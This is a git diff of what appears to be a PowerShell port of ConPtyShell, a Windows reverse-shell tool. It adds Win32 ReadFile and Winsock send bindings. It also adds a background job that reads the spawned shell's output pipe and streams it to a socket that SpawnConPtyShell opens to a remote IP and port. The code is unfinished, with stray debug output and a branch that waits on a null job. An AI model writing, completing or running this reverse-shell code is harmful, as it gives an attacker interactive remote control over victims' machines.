@@ -888,6 +888,9 @@ $FunctionDefinitions = @(
     (func kernel32 GetStdHandle ([IntPtr]) @([Int32])),  
     (func kernel32 CloseHandle ([Bool]) @([IntPtr])),
     (func kernel32 CreatePipe ([Bool]) @([IntPtr].MakeByRefType(), [IntPtr].MakeByRefType(), $global:SECURITY_ATTRIBUTES_TYPE.MakeByRefType(), [UInt32]) -EntryPoint CreatePipe -SetLastError),
+#    private static extern bool ReadFile(IntPtr hFile, [Out] byte[] lpBuffer, uint nNumberOfBytesToRead, out uint lpNumberOfBytesRead, IntPtr lpOverlapped);
+    (func kernel32 ReadFile ([Bool]) @([IntPtr], [Byte[]], [UInt32], [UInt32], [IntPtr]) -SetLastError),
+
     (func kernel32 CreatePseudoConsole ([Int32]) @($global:COORD.MakeByRefType(), [IntPtr], [IntPtr], [UInt32], [IntPtr])),
     (func kernel32 ClosePseudoConsole ([Int32]) @([IntPtr])),
    
@@ -908,6 +911,7 @@ $FunctionDefinitions = @(
     (func ws2_32 WSAGetLastError ([Int32])),
     (func ws2_32 WSAStartup ([Int32]) @([Int16], $global:WSAData_TYPE.MakeByRefType())),
     (func ws2_32 recv ([Int32]) @([IntPtr], [Byte[]], [Int32], [UInt32]) -Charset Auto -SetLastError),
+    (func ws2_32 send ([Int32]) @([IntPtr], [Byte[]], [Int32], [UInt32]) -Charset Auto -SetLastError),
     (func ntdll NtSuspendProcess ([UInt32]) @([IntPtr])),
     (func ntdll NtResumeProcess ([UInt32]) @([IntPtr]))
 )
@@ -1008,7 +1012,6 @@ class ConPtyShell {
         if (! $Kernel32::CreatePipe($OutputPipeRead, $OutputPipeWrite, [ref]$pSec, [ConPtyShell]::BUFFER_SIZE_PIPE)) {
             throw [ConPtyShellException] "Could not create the OutputPipe"
         }
-        $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
     }
 
     hidden static [void] InitConsole([ref] $oldStdIn, [ref] $oldStdOut, [ref] $oldStdErr) {
@@ -1026,19 +1029,61 @@ class ConPtyShell {
         $Kernel32::SetStdHandle([ConPtyShell]::STD_INPUT_HANDLE, $hStdin);
     }
 
-    hidden static [System.Threading.Thread] StartThreadReadPipeWriteSocket([IntPtr] $OutputPipeRead, [IntPtr] $shellSocket, [bool] $overlappedSocket)
-    {
-        #object[] threadParameters = new object[2];
+    
+#    hidden static [void] ThreadReadPipeWriteSocketOverlapped([object] $threadParams) {
+    # hidden static [void] ThreadReadPipeWriteSocketOverlapped([IntPtr] $OutputPipeRead, [IntPtr] $shellSocket) {
+    #     #object[] $threadParameters = (object[])threadParams;
+    #     # $threadParameters = $threadParams
+    #     # [IntPtr] $OutputPipeRead = [IntPtr]$threadParameters[0]
+    #     # [IntPtr] $shellSocket = [IntPtr]$threadParameters[1]
+
+    #     Write-Host "Hi everyone !"
         
-        threadParameters[0] = OutputPipeRead;
-        threadParameters[1] = shellSocket;
-        Thread thThreadReadPipeWriteSocket;
-        if(overlappedSocket)
-            thThreadReadPipeWriteSocket = new Thread(ThreadReadPipeWriteSocketOverlapped);
-        else
-            thThreadReadPipeWriteSocket = new Thread(ThreadReadPipeWriteSocketNonOverlapped);
-        thThreadReadPipeWriteSocket.Start(threadParameters);
-        return thThreadReadPipeWriteSocket;
+    #     [UInt32] $bufferSize = 8192
+    #     [Bool]   $readSuccess = $false
+    #     [Int32]  $bytesSent = 0
+    #     [UInt32] $dwBytesRead = 0
+    #     do
+    #     {
+    #         [byte[]] $bytesToWrite = New-Object Byte[] $bufferSize
+    #         $readSuccess = $global:Kernel32::ReadFile($OutputPipeRead, $bytesToWrite, $bufferSize, $dwBytesRead, [IntPtr]::Zero)
+    #         $bytesSent = $global:Kernel32::send($shellSocket, $bytesToWrite, $dwBytesRead, 0)
+    #     } while ($bytesSent -gt 0 -and $readSuccess)
+    #     # Console.WriteLine("debug: bytesSent = " + bytesSent + " WSAGetLastError() = " + WSAGetLastError().ToString());
+    # }
+
+    #hidden static [System.Threading.Thread] StartThreadReadPipeWriteSocket([IntPtr] $OutputPipeRead, [IntPtr] $shellSocket, [bool] $overlappedSocket)
+    hidden static [void] StartThreadReadPipeWriteSocket([IntPtr] $OutputPipeRead, [IntPtr] $shellSocket, [bool] $overlappedSocket)
+    {
+        $ThreadReadPipeWriteSocketOverlapped = {
+            param($OutputPipeRead, $shellSocket)
+
+            [UInt32] $bufferSize = 8192
+            [Bool]   $readSuccess = $false
+            [Int32]  $bytesSent = 0
+            [UInt32] $dwBytesRead = 0
+            do
+            {
+                [byte[]] $bytesToWrite = New-Object Byte[] $bufferSize
+                $readSuccess = $global:Kernel32::ReadFile($OutputPipeRead, $bytesToWrite, $bufferSize, $dwBytesRead, [IntPtr]::Zero)
+                $bytesSent = $global:Kernel32::send($shellSocket, $bytesToWrite, $dwBytesRead, 0)
+            } while ($bytesSent -gt 0 -and $readSuccess)
+            
+        }
+    
+        if($overlappedSocket) {
+            $job = Start-Job -ScriptBlock $ThreadReadPipeWriteSocketOverlapped -ArgumentList $OutputPipeRead, $shellSocket
+        } else {
+            $job = $null
+            Write-Host "Domache"
+        }
+        Wait-Job $job
+        Receive-Job $job
+        Get-Job $job
+        # Wait-Job $job
+#            thThreadReadPipeWriteSocket = new Thread(ThreadReadPipeWriteSocketNonOverlapped);
+#        thThreadReadPipeWriteSocket.Start(threadParameters);
+#        return thThreadReadPipeWriteSocket;
     }
 
     static [string] SpawnConPtyShell([string] $remoteIp, [uint32] $remotePort, [uint32] $rows, [uint32] $cols, [string] $commandLine, [bool] $upgradeShell) {
